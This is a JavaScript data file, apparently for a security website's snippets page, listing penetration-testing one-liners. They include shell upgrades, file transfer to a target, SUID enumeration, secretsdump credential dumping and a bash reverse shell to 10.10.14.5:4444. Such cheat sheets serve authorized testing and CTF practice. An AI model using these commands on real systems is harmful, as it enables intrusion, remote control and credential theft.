// Reusable one-liners / scripts shown on /snippets.
//   title:    short name
//   lang:     language for syntax highlighting + the displayed label
//   tags:     for filtering
//   desc:     one-line explanation
//   code:     the snippet (use a template string for multi-line)
export const snippets = [
  {
    title: 'Spawn a TTY shell',
    lang: 'bash',
    tags: ['Shell', 'Post-Exploitation'],
    desc: 'Upgrade a dumb reverse shell to a proper interactive PTY.',
    code: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
  },
  {
    title: 'Stabilize the shell (full upgrade)',
    lang: 'bash',
    tags: ['Shell', 'Post-Exploitation'],
    desc: 'Background, fix the local terminal, then foreground for a full TTY.',
    code: `python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 50 cols 200`,
  },
  {
    title: 'Host a quick HTTP server',
    lang: 'bash',
    tags: ['Transfer', 'Recon'],
    desc: 'Serve the current directory to move files onto a target.',
    code: `python3 -m http.server 8000`,
  },
  {
    title: 'Download a file on Windows',
    lang: 'powershell',
    tags: ['Transfer', 'Windows'],
    desc: 'Pull a file from your HTTP server onto a Windows host.',
    code: `iwr -Uri http://10.10.14.5:8000/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe`,
  },
  {
    title: 'Find SUID binaries',
    lang: 'bash',
    tags: ['Privesc', 'Linux'],
    desc: 'Enumerate SUID binaries for a Linux privesc path.',
    code: `find / -perm -4000 -type f 2>/dev/null`,
  },
  {
    title: 'Generate an Impacket secretsdump',
    lang: 'bash',
    tags: ['Active Directory', 'Credentials'],
    desc: 'Dump NTDS/SAM hashes with a known credential.',
    code: `secretsdump.py 'DOMAIN/user:Password123@10.10.10.10'`,
  },
  {
    title: 'Bash reverse shell',
    lang: 'bash',
    tags: ['Shell'],
    desc: 'A no-frills bash reverse shell back to your listener.',
    code: `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`,
  },
]
